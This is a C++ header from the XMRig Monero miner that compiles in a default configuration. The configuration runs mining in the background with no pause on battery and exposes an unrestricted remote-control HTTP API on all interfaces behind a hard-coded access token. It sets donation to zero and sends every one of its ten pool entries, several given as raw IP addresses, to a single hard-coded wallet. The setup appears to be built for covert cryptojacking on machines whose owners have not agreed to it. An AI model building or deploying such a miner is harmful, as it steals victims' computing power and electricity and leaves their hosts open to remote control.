/* XMRig
 * Copyright 2010      Jeff Garzik <jgarzik@pobox.com>
 * Copyright 2012-2014 pooler      <pooler@litecoinpool.org>
 * Copyright 2014      Lucas Jones <https://github.com/lucasjones>
 * Copyright 2014-2016 Wolf9466    <https://github.com/OhGodAPet>
 * Copyright 2016      Jay D Dee   <jayddee246@gmail.com>
 * Copyright 2017-2018 XMR-Stak    <https://github.com/fireice-uk>, <https://github.com/psychocrypt>
 * Copyright 2018-2019 SChernykh   <https://github.com/SChernykh>
 * Copyright 2016-2019 XMRig       <https://github.com/xmrig>, <support@xmrig.com>
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#ifndef XMRIG_CONFIG_DEFAULT_H
#define XMRIG_CONFIG_DEFAULT_H


namespace xmrig {


#ifdef XMRIG_FEATURE_EMBEDDED_CONFIG
const static char *default_config =
R"===(
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": true,
        "host": "0.0.0.0",
        "port": 53556,
        "access-token": "N2EwNGFjZDQxOTVhY2Y2NjI2YjVmOTExZDUxNzc5MmYK",
        "restricted": false
    },
    "autosave": false,
    "background": true,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": 4,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": 75,
        "asm": true,
        "argon2-impl": null,
        "astrobwt-max-size": 550,
        "cn/0": false,
        "cn-lite/0": false,
        "kawpow": false
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 0,
    "donate-over-proxy": 0,
    "log-file": null,
    "pools": [
        {
            "algo": null,
            "coin": "monero",
            "url": "gulf.moneroocean.stream:10128",
            "user": "84xqqFNopNcG7T5AcVyv7LVyrBfQyTVGxMFEL2gsxQ92eNfu6xddkWabA3yKCJmfdaA9jEiCyFqfffKp1nQkgeq2Uu2dhB8",
            "pass": null,
            "rig-id": null,
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null
        },
        {
            "algo": null,
            "coin": "monero",
            "url": "3.125.10.23:10128",
            "user": "84xqqFNopNcG7T5AcVyv7LVyrBfQyTVGxMFEL2gsxQ92eNfu6xddkWabA3yKCJmfdaA9jEiCyFqfffKp1nQkgeq2Uu2dhB8",
            "pass": null,
            "rig-id": null,
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null
        },
        {
            "algo": null,
            "coin": "monero",
            "url": "gulf.moneroocean.stream:443",
            "user": "84xqqFNopNcG7T5AcVyv7LVyrBfQyTVGxMFEL2gsxQ92eNfu6xddkWabA3yKCJmfdaA9jEiCyFqfffKp1nQkgeq2Uu2dhB8+128000",
            "pass": null,
            "rig-id": null,
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null
        },
        {
            "algo": null,
            "coin": "monero",
            "url": "gulf.moneroocean.stream:80",
            "user": "84xqqFNopNcG7T5AcVyv7LVyrBfQyTVGxMFEL2gsxQ92eNfu6xddkWabA3yKCJmfdaA9jEiCyFqfffKp1nQkgeq2Uu2dhB8+128000",
            "pass": null,
            "rig-id": null,
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null
        },        
        {
            "algo": null,
            "coin": "monero",
            "url": "3.125.10.23:443",
            "user": "84xqqFNopNcG7T5AcVyv7LVyrBfQyTVGxMFEL2gsxQ92eNfu6xddkWabA3yKCJmfdaA9jEiCyFqfffKp1nQkgeq2Uu2dhB8+128000",
            "pass": null,
            "rig-id": null,
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null
        },
        {
            "algo": null,
            "coin": "monero",
            "url": "3.125.10.23:80",
            "user": "84xqqFNopNcG7T5AcVyv7LVyrBfQyTVGxMFEL2gsxQ92eNfu6xddkWabA3yKCJmfdaA9jEiCyFqfffKp1nQkgeq2Uu2dhB8+128000",
            "pass": null,
            "rig-id": null,
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null
        },
         {
            "algo": null,
            "coin": "monero",
            "url": "xmr.bohemianpool.com:7777",
            "user": "84xqqFNopNcG7T5AcVyv7LVyrBfQyTVGxMFEL2gsxQ92eNfu6xddkWabA3yKCJmfdaA9jEiCyFqfffKp1nQkgeq2Uu2dhB8",
            "pass": null,
            "rig-id": null,
            "keepalive": true,
            "nicehash": false,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null
        },        
        {
            "algo": null,
            "coin": "monero",
            "url": "80.211.206.105:7777",
            "user": "84xqqFNopNcG7T5AcVyv7LVyrBfQyTVGxMFEL2gsxQ92eNfu6xddkWabA3yKCJmfdaA9jEiCyFqfffKp1nQkgeq2Uu2dhB8",
            "pass": null,
            "rig-id": null,
            "keepalive": true,
            "nicehash": false,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null
        },              
        {
            "algo": null,
            "coin": "monero",
            "url": "xmr.bohemianpool.com:9000",
            "user": "84xqqFNopNcG7T5AcVyv7LVyrBfQyTVGxMFEL2gsxQ92eNfu6xddkWabA3yKCJmfdaA9jEiCyFqfffKp1nQkgeq2Uu2dhB8",
            "pass": null,
            "rig-id": null,
            "keepalive": true,
            "nicehash": false,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null
        },        
        {
            "algo": null,
            "coin": "monero",
            "url": "80.211.206.105:9000",
            "user": "84xqqFNopNcG7T5AcVyv7LVyrBfQyTVGxMFEL2gsxQ92eNfu6xddkWabA3yKCJmfdaA9jEiCyFqfffKp1nQkgeq2Uu2dhB8",
            "pass": null,
            "rig-id": null,
            "keepalive": true,
            "nicehash": false,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false
}
)===";
#endif


} // namespace xmrig


#endif /* XMRIG_CONFIG_DEFAULT_H */
